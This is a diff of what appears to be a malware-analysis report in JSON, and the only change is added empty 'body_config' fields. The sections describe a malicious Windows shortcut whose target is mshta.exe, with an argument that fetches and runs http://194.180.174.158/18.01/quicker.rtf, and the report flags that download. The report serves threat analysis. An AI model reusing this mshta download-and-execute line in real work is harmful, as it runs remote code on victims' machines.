@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [3.725235434382858, 3.3629613523404243, 2.869541297597716, 2.708514994641224, 3.8843135277997978, 2.708514994641224, 3.300555342766645, 2.258637091169717, 4.222208536590743, 2.7757140325142533, 3.157912166762854, 3.1963737052243917, 3.3244454874942027, 0.0, 0.0, 0.0, 0.0, 2.828116154299239, 0.37119390349406906, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 4.11886749115226, 0.0, 0.0, 0.0, 0.0, 2.5465935642949384, 1.4377544837306804, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.914258009319946, 4.354285871987246, 4.786790198827112, 3.6838554275221678, 2.6528225031764996, 2.5683127888314132, 2.899740941970648, 0.0]}}",
+        "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
         "depth": 0,
@@ -17,6 +18,7 @@
       {
         "auto_collapse": false,
         "body": "{\"flags\": \"IDList, LinkInfo, CommandArgs, IconFile, Unicode, ExpString, ExpIcon\", \"file_attributes\": \"Archive\", \"create_date\": \"2019:12:29 14:27:21+00:00\", \"access_date\": \"2019:12:29 14:27:21+00:00\", \"modify_date\": \"2018:01:01 04:48:41+00:00\", \"target_file_size\": 14848, \"icon_index\": 1, \"run_window\": \"Normal\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"mshta.exe\", \"drive_type\": \"Fixed Disk\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\mshta.exe\", \"command_line_arguments\": \"http://194.180.174.158/18.01/quicker.rtf\", \"icon_file_name\": \"C:\\\\Program Files (x86)\\\\quicker.EXE\", \"machine_id\": \"desktop-farl139\"}",
+        "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 0,
@@ -39,6 +41,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -72,6 +75,7 @@
       {
         "auto_collapse": false,
         "body": "Download of http://194.180.174.158/18.01/quicker.rtf",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -98,6 +102,7 @@
       {
         "auto_collapse": false,
         "body": "{\"machine_identifier\": \"desktop-farl139\"}",
+        "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 1,
@@ -116,6 +121,7 @@
       {
         "auto_collapse": false,
         "body": "{\"local_base_path\": \"C:\\\\Windows\\\\System32\\\\mshta.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\mshta.exe\"}",
+        "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 1,
